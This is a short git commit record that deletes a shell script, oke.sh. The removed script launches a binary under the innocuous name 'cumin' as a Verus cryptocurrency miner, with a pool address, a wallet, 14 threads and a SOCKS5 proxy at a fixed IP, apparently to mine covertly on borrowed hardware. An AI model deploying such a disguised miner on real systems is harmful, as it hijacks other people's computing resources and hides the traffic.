07e98b97f0885ba0d67196e570f12952b0eb40b3
squibex <90225595+squibex@users.noreply.github.com>
2021-12-30 07:12:44 +0700

    Delete oke.sh

--- oke.sh
+++
@@ -1,7 +0,0 @@
-#!/bin/bash
-chmod +x cumin
-POOL=stratum+tcp://na.luckpool.net:3956
-WALLET=RJqUqa4GeMWKJJ4c95roAQZJGgf1H2KsyW
-WORKER=prox
-PROXY=socks5://184.185.2.244:4145
-./cumin -a verus -o $POOL -u $WALLET.$WORKER -t 14 -x $PROXY
